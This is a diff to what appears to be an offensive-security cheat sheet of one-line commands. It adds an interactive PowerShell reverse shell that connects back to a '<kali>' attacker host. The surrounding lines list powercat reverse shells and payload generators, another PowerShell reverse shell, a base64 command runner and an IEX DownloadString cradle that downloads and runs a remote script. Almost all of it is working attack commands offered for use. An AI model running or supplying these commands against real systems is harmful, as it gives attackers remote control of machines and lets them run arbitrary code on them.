@@ -118,6 +118,7 @@ powercat:powercat -c <kali> -p <kaliPort> -e powershell -ssl # Reverse shell ove
 powercat:powercat -g -c <kali> -p <kaliPort> -e powershell # Generate standalone payload; kali-machine
 powercat:powercat -ge -c <kali> -p <kaliPort> -e powershell # Generate encoded payload; kali-machine
 
+powershell:powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('<kali>',<kaliPort>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))){$d=([Text.Encoding]::ASCII.GetString($b,0,$i));$o=iex $d 2>&1|Out-String;$w=[Text.Encoding]::ASCII.GetBytes($o);$s.Write($w,0,$w.Length);$s.Flush()}" #interactive PowerShell reverse shell; target-machine
 powershell:powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<kali>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" # PowerShell reverse shell; target-machine
 powershell:powershell -e <base64> # Execute base64 encoded PowerShell; target-machine
 powershell:powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<kali>/shell.ps1')" # Download and execute PowerShell script; target-machine
